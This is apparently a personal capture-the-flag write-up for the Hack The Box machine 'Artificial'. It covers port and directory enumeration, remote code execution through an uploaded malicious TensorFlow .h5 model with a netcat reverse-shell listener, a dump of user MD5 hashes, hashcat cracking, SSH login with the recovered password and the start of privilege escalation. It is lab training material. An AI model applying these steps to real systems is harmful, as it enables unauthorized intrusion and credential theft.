---
tags:
  - CTF
  - Easy
---
# Box: Artificial
## Enumeration
### nmap
```
❯ sudo nmap -sV -sC 10.10.11.74
[sudo] password for pytho: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 19:18 CET
Nmap scan report for 10.10.11.74
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://artificial.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 450.90 seconds
```
### ffuf
```
❯ ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://artificial.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 857, Words: 162, Lines: 29, Duration: 100ms]
register                [Status: 200, Size: 952, Words: 182, Lines: 34, Duration: 106ms]
logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 60ms]
dashboard               [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 43ms]
                        [Status: 200, Size: 5442, Words: 1267, Lines: 162, Duration: 36ms]
```
## Exploitation

Found this: https://github.com/Splinter0/tensorflow-rce/blob/main/exploit.py

### Docker
```
docker build . -t test
docker run -it -v $(pwd):/mnt test

root@964f44f5d14c:/code# cd /mnt
root@964f44f5d14c:/mnt# ls
Dockerfile	exploit.py

root@964f44f5d14c:/mnt# python3 exploit.py
```

1. Upload the .h5 file to website
2. Listen `nc -lvnp 6666` 
3. Click "View Predictions"
4. Stabilize shell
5. cat app.py

cd instance

SQL file

host python server and download the file

```
❯ sqlite3 users.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
model  user 
sqlite> select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|xnoob|xnoob@htb.com|2794128da02215276f1140631d8786ed
7|huguxs|huguxs@mail.htb|5f4dcc3b5aa765d61d8327deb882cf99
8|asd33|zihzqftwwobfogzcul@enotj.com|67117df1e2ca460c52084ca261aa85e8
9|test|test@test.fr|098f6bcd4621d373cade4e832627b4f6
10|MaxTermux|sokapikachu993@gmail.com|63a9f0ea7bb98050796b649e85481845
11|ippsec|root@ippsec.rocks|5f4dcc3b5aa765d61d8327deb882cf99
12|asd|asdasd@ksad.fi|a8f5f167f44f4964e6c998dee827110c
13|paviaani|Paviaani@zoo.fi|a8f5f167f44f4964e6c998dee827110c
14|candybox|candybox@artificial.htb|7cb4e4c4b4c004c5c3f9e7b6bb291b2f
15|izan|izan@izan.com|033e5426fba5cbf1bfdbd61fb6998d91
16|luis|luis@ippsec.com|9cdfb439c7876e703e307864c9167a15
17|pop|lol@gmail.com|1b80c66fa2d7186a462020c33d639557
18|popi|lm@gmail.com|81dc9bdb52d04dc20036dbd8313ed055
19|m13|m@m.m|01eea3d08de140d10f208f90a16b712c
20|test123|test@test.com|098f6bcd4621d373cade4e832627b4f6
21|hola|hola@hola.es|4d186321c1a7f0f354b297e8914ab240
22|testuser|testuser@gmail.com|ae2b1fca515949e5d54fb22b8ed95575
```

### Hashcat in.

hashcat -m0 -a0 hashes /usr/share/wordlists/rockyou.txt

Hashcat output: `c99175974b6e192936d97224638a34f8:mattp005numbertwo` <br>

SSH In.
```
ssh gael@10.10.11.74
password: mattp005numbertwo
```

## Privilege Escalation

After using linpeas.sh I found something interesting.

Port forward:

`ssh -L 9898:127.0.0.1:9898 -N -vv gael@artificial.htb` 

go to 127.0.0.1:9898


## Flags
```
gael@artificial:~$ cat user.txt
43886f55b2f9c8ba4141dc6dd49b5c0f
```